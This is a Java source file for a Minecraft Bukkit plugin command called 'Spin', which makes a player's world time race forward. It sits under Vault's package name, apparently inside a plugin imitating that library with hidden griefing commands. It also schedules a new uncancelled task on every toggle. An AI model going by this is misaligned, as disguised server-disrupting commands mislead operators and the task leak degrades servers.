package net.milkbowl.vault.commands.cmds;

import java.util.ArrayList;

import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;

public class Spin extends CommandManager {
	
	private final ArrayList<World> worlds = new ArrayList<>();
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (worlds.contains(p.getWorld())) {
			worlds.remove(p.getWorld());
			p.sendMessage(Settings.PREFIX("The world has stopped spinning!"));
		} else {
			worlds.add(p.getWorld());
			p.sendMessage(Settings.PREFIX("The world is now spinning!"));
			
	        Bukkit.getServer().getScheduler().scheduleSyncRepeatingTask(plugin, () -> {
	            for (World world : worlds) {
	                world.setTime(world.getTime() + 100);
	            }
	        }, 1L, 1L);
		}
	}

}
